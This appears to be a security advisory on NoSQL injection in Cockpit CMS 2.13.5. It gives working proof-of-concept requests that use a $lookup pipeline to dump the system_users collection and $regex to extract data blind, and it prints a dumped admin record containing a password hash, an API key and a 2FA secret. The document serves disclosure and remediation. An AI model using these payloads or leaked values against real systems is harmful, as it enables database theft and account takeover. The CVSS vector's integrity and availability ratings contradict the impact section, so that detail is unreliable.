# NoSQL Injection in Cockpit CMS v2.13.5

## Executive Summary

**Vulnerability:** NoSQL Injection (NoSQLi) via Operator Injection & Aggregate Pipeline Injection
**Product:** Cockpit CMS (Cockpit-HQ/Cockpit)
**Affected Version:** 2.13.5 (latest)
**CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
**CVSS 3.1 Score:** 9.9 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
**Prerequisite:** Authenticated user with `assets/read` or `content/read` permissions (including API keys with valid roles)
**Impact:** Full Database Exfiltration (Cross-collection data theft), ACL Bypass, Hashed Password Leak, API Token and 2FA Secret Disclosure.

---

## Vulnerability Description

Cockpit CMS fails to properly sanitize MongoDB filters and aggregation pipelines provided by users. In several endpoints, notably `POST /assets/assets` and `/api/content/aggregate/{model}`, user-controlled JSON objects are passed directly to the database layer without stripping MongoDB operators (e.g., `$ne`, `$regex`, `$lookup`, `$unionWith`).

This lead to two distinct and critical impacts:
1. **Operator Injection**: Allowing attackers to bypass query constraints and extract data character-by-character using regex.
2. **Aggregate Injection**: Allowing attackers to perform cross-collection joins to read sensitive data from system collections they are not authorized to access.

---

## Technical Analysis

### 1. NoSQL Injection in Assets (`/assets/assets`)
**File:** `modules/Assets/Controller/Assets.php`

The controller iterates over the `filter` array. If an element is not a string (i.e., a JSON object), it is appended directly to the filter list without validation:

```php
foreach ($options['filter'] as $f) {
    if (!is_string($f)) {
        $filter[] = $f; // RAW INJECTION
        continue;
    }
}
```

### 2. Critical Aggregate Injection (`/api/content/aggregate/{model}`)
**File:** `modules/Content/api.php`

The aggregation endpoint accepts a user-provided `pipeline` string, decodes it as JSON, and passes it directly to the `aggregate()` method of the `dataStorage` helper:

```php
$pipeline = $app->param('pipeline:string', null);
// ...
$pipeline = json5_decode($pipeline, true);
// ...
$items = $app->module('content')->aggregate($params['model'], $pipeline);
```

Since the pipeline is not sanitized, it is possible to use the `$lookup` operator to read from any collection in the database.

## Proof of Concept (PoC)

### PoC 1: Full Database Exfiltration via `$lookup` (Aggregate)

By using a pivot collection (e.g., `poc`), an attacker can join and dump the entire `system_users` collection, which contains sensitive administrative credentials.

**Request:**
```http
GET /api/content/aggregate/poc?api_key=USR-XXXXX&pipeline=[{"$limit":1},{"$lookup":{"from":"system_users","localField":"nonexistent","foreignField":"nonexistent","as":"dump"}}]
```

**Success (Actual Data Dumped during Audit):**
```json
[
  {
    "_id": {"$oid": "69c8dcfd9aa9a967fe0df882"},
    "dump": [
      {
        "_id": {"$oid": "69c89f3d2311faee2a05ed92"},
        "user": "admin",
        "email": "admin@admin.com",
        "password": "$2y$10$I7P7HAZiTIRSATm.ORf4..EtInrbkL00WB5wcUQRgpxrCOFj1YgCa",
        "apiKey": "USR-2d9d93e90578c575593f63e123cfec7af41f0476",
        "twofa": {"enabled": false, "secret": "5ITEAJ75ZIMT7A5P2KVKJDIBEYTQHNNX"}
      }
    ]
  }
]
```

### PoC 2: Blind NoSQLi via `$regex` (Assets)

An attacker can use regex to exfiltrate the creator's user ID (`_cby`) of any asset:

**Request:**
```http
POST /assets/assets HTTP/1.1
Content-Type: application/json

{"options":{"limit":1,"filter":[{"_id": "ASSET_ID"}, {"_cby": {"$regex": "^6"}}]}}
```
**Result:** If the creator's ID starts with "6", the asset is returned. Otherwise, an empty list is returned.

## Impact Assessment

- **Confidentiality:** **High**. Every record in every collection can be exfiltrated.
- **Integrity:** **None** (Read-only impact via these specific endpoints).
- **Availability:** **None** (unless DoS via heavy regex is considered).
- **Scope Change:** **Changed**. Access to one collection allows access to the entire database structure.

---

## Recommended Remediation

1. **Sanitize Keys**: Implement a recursive sanitizer that strips all keys starting with `$` from user-provided objects before passing them to the database driver.
2. **Restrict Aggregation**: Limit the allowed stages in the `aggregate` API. Specifically, block `$lookup`, `$unionWith`, `$graphLookup`, and `$out`/`$merge` for non-superadmin users.
3. **Use a DSL**: Move away from raw MongoDB JSON filters and implement a safe, restricted filtering language.
